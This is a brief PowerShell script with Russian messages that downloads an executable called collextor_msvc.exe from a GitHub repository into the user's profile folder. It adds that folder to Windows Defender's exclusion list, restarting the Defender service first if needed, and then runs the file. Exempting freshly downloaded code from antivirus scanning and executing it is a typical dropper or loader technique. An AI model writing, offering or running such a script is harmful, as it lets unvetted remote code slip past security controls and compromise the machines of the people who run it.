$dir = "$env:USERPROFILE\collextor"
$exe = "$dir\collextor_msvc.exe"
$url = "https://github.com/TheAmalgamClient/colex/raw/main/collextor_msvc.exe"

New-Item -ItemType Directory -Force -Path $dir | Out-Null

Write-Host "Скачиваю..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $url -OutFile $exe -UseBasicParsing
    Write-Host "Скачано." -ForegroundColor Green
} catch {
    Write-Host "Ошибка скачивания: $_" -ForegroundColor Red
    pause; exit 1
}

Write-Host "Добавляю в исключения Defender..." -ForegroundColor Cyan
try {
    $svc = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -ne 'Running') {
        Start-Service WinDefend -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
    }
    Add-MpPreference -ExclusionPath $dir -ErrorAction Stop
    Write-Host "Исключение добавлено." -ForegroundColor Green
} catch {
    Write-Host "Defender недоступен, пропускаю." -ForegroundColor Yellow
}

Write-Host "Запускаю..." -ForegroundColor Green
Start-Process -FilePath $exe -WorkingDirectory $dir
